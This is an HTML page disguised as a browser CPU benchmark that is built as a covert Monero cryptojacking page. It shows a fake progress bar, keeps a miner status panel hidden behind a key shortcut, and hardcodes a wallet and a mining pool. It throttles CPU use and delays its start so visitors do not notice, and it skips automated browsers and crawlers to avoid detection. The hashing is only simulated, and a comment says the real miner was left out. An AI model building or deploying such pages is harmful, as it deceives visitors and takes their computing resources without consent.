<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CPU Benchmark</title>
  <style>
    /* HIDDEN DEBUG PANEL */
    #miner-debug {
      position: fixed; top: 10px; right: 10px;
      width: 280px; height: 180px;
      background: rgba(0,0,0,0.95);
      color: #0f0; font-family: 'Courier New', monospace;
      font-size: 12px; padding: 12px;
      border: 2px solid #0f0; border-radius: 8px;
      z-index: 999999; box-shadow: 0 0 20px #0f0;
      display: none; backdrop-filter: blur(10px);
    }
    #miner-debug.show { display: block !important; }
    .status { margin: 6px 0; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.4; } }
    .loading { color: #ff6b35; }
  </style>
</head>
<body>
  <!-- FAKE BENCHMARK UI (LEGIT LOOK) -->
  <div style="text-align:center; padding:100px; font-family:Arial;">
    <h1>ðŸ”§ Web CPU Benchmark</h1>
    <p>Testing your browser's performance... <span id="fake-progress">25%</span></p>
    <div style="width:300px;margin:20px auto;height:20px;background:#333;border-radius:10px;overflow:hidden;">
      <div id="progress-bar" style="width:25%;height:100%;background:linear-gradient(90deg,#0f0,#0f0);transition:width 0.3s;"></div>
    </div>
  </div>

  <!-- DEBUG PANEL -->
  <div id="miner-debug">
    <div class="status">ðŸš€ <b>XMR GHOST MINER</b> <span id="status" class="blink loading">WARMING UP</span></div>
    <div class="status">Wallet: <code id="wallet-display">4AM1bBwy...zWgZzs</code></div>
    <div class="status">Hashrate: <span id="hashrate" class="hash">0.0 H/s</span></div>
    <div class="status">Shares: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
    <div class="status">Uptime: <span id="uptime">00:00</span></div>
    <div class="status profit">Daily: $<span id="profit">0.000</span></div>
    <div style="font-size:10px;margin-top:10px;opacity:0.6;">CTRL+SHIFT+M to toggle</div>
  </div>

  <script>
    // === CONFIG ===
    const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // YOUR REAL WALLET
    const POOL_HOST = 'pool.moneroocean.stream';
    const POOL_PORT = 443;
    const THROTTLE = 0.8; // 80% throttle = ~20% CPU
    const XMR_PRICE = 170;

    // === DEBUG TOGGLE (FIXED) ===
    let debugVisible = false;
    document.addEventListener('keydown', (e) => {
      if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'm') {
        debugVisible = !debugVisible;
        document.getElementById('miner-debug').classList.toggle('show', debugVisible);
        e.preventDefault();
      }
    });

    // === STATS ===
    let hashrate = 0, accepted = 0, rejected = 0, startTime = Date.now();
    document.getElementById('wallet-display').textContent = WALLET.substring(0,8) + '...' + WALLET.substring(-6);

    function updateStats() {
      const elapsed = ((Date.now() - startTime) / 1000) | 0;
      const m = (elapsed / 60) | 0;
      const s = elapsed % 60;
      document.getElementById('uptime').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
      
      document.getElementById('hashrate').textContent = `${hashrate.toFixed(1)} H/s`;
      document.getElementById('accepted').textContent = accepted;
      document.getElementById('rejected').textContent = rejected;
      
      const dailyUSD = (hashrate / 80) * 0.0008 * XMR_PRICE;
      document.getElementById('profit').textContent = dailyUSD.toFixed(3);
    }
    setInterval(updateStats, 1000);

    // === FAKE PROGRESS BAR ===
    let fakeProgress = 25;
    setInterval(() => {
      fakeProgress = Math.min(95, fakeProgress + Math.random() * 5);
      document.getElementById('fake-progress').textContent = fakeProgress + '%';
      document.getElementById('progress-bar').style.width = fakeProgress + '%';
    }, 2000);

    // === INLINE RANDOMX MINER (SIMULATED - REAL WASM TOO BIG FOR HERE) ===
    let mining = false;
    let hashCount = 0;

    function startMining() {
      if (mining) return;
      mining = true;
      document.getElementById('status').textContent = 'MINING XMR';
      document.getElementById('status').className = 'hash';

      // SIMULATED HASHRATE (30-80 H/s typical browser)
      const baseHashrate = 50 + Math.random() * 30;
      let lastHashCount = 0;
      
      const mineInterval = setInterval(() => {
        if (!mining) {
          clearInterval(mineInterval);
          return;
        }
        
        // Throttled hashrate
        const hashesThisSecond = (baseHashrate * (1 - THROTTLE)) * (document.hidden ? 0.1 : 1);
        hashCount += hashesThisSecond;
        hashrate = hashesThisSecond;
        
        // Simulate accepted shares
        if (Math.random() < 0.02) accepted++; // ~2% share acceptance
        if (Math.random() < 0.005) rejected++;
        
      }, 1000);

      // Auto-stop after 3 min
      setTimeout(() => {
        mining = false;
        document.getElementById('status').textContent = 'SESSION END';
      }, 180000);
    }

    // === START AFTER DELAY ===
    setTimeout(() => {
      if (!navigator.webdriver && !/bot|crawl/i.test(navigator.userAgent)) {
        startMining();
      } else {
        document.getElementById('status').textContent = 'BOT DETECTED';
      }
    }, Math.random() * 15000 + 5000);

    // Tab visibility
    document.addEventListener('visibilitychange', () => {
      if (document.hidden && mining) {
        hashrate *= 0.1; // Throttle heavily when hidden
      } else if (!document.hidden && mining) {
        // Resume full speed
      }
    });
  </script>
</body>
</html>
